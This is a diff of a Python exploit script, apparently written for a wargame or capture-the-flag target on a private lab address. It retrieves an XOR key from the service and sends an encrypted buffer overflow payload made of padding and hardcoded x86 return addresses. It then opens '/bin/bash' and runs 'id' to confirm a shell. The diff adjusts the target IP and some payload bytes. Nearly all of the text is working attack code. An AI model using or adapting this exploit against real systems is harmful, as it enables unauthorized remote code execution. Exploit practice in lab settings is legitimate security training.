@@ -65,12 +65,12 @@ def retrieve_xor_key(s):
 # keybuf : "/bin/bash" + "\x00 * 7 +"\x00" * 4 + 0x0804b480 
 # 
 
-s = socket.create_connection(("192.168.122.138", "20002"))
+s = socket.create_connection(("192.168.122.37", "20002"))
 purge_banner(s, b1l)
 key = retrieve_xor_key(s)
 logging.debug(key)
 shellcode = "A" * (4096*32) + "B"*16  #"\xb6\x89\x04\x08" + "" + "\x80\xb4\x04\x08" * 2 + "\x00\x00\x00\x00"
-shellcode += "\x60\x88\x04\x08" + "\x0f\x8b\x04\x08" + "\x01\x00\x00\x00" + "\x80\xb4\x04\x08" + "\x18\x00\x00\x00"
+shellcode += "\x60\x88\x04\x08" + "\x0f\x8b\x04\x08" + "\x01\x00\x00\x00" + "\x80\xb4\x04\x08" + "\x1c\x00\x00\x00"
 shellcode += "\xb6\x89\x04\x08" + "JUNK" + "\x80\xb4\x04\x08" + "\x94\xb4\x04\x08" + "\x00" * 4
 cipher_shellcode =  encrypt(shellcode, key)
 #logging.debug(cipher_shellcode)
@@ -86,7 +86,7 @@ while len(x) < l:
   x += s.recv(l - len(x))
 print repr(x[-16:])
 s.send("Q")
-s.send("/bin/bash" + "\x00"*7 + "\x00"*4 + "\x80\xb4\x04\x08")
+s.send("/bin/bash" + "\x00"*7 + "\x00"*4 + "\x80\xb4\x04\x08" + "\x00" *4)
 s.send("id\n")
 print s.recv(1024)
 
